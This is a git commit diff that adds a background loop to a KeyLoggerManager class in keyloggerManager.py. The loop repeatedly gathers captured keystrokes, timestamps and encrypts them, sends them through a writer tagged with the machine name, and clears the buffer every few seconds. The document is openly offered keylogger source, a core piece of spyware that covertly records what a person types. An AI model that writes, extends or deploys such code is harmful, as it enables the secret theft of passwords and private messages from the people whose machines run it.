547d9d46acd695b4e6e669a7cee356ca1aba5b2b
Yakir Uzan <yakiruzangreen@gmail.com>
2025-02-20 16:03:35 +0200

    The function runs in the background, collects keys, encrypts them, and saves them to a file every few seconds.

--- keyloggerManager.py
+++ keyloggerManager.py
@@ -1,3 +1,6 @@
+from datetime import datetime
+import time
+
 class KeyLoggerManager:
     def __init__(self, keylogger, writer, encryptor, interval=5, machine_name="Machine1"):
         self.keylogger = keylogger
@@ -8,3 +11,15 @@ class KeyLoggerManager:
         self.buffer = []
         self.running = False
         self.thread = None
+
+    def collect_and_store(self):
+        while self.running:
+            keys = self.keylogger.get_logged_keys()
+            if keys:
+                keys = [key for key in keys if key is not None]
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                data = f"{timestamp} - {''.join(keys)}"
+                encrypted_data = self.encryptor.encrypt(data)
+                self.writer.send_data(encrypted_data, self.machine_name)
+                self.keylogger.logged_keys.clear()
+            time.sleep(self.interval)
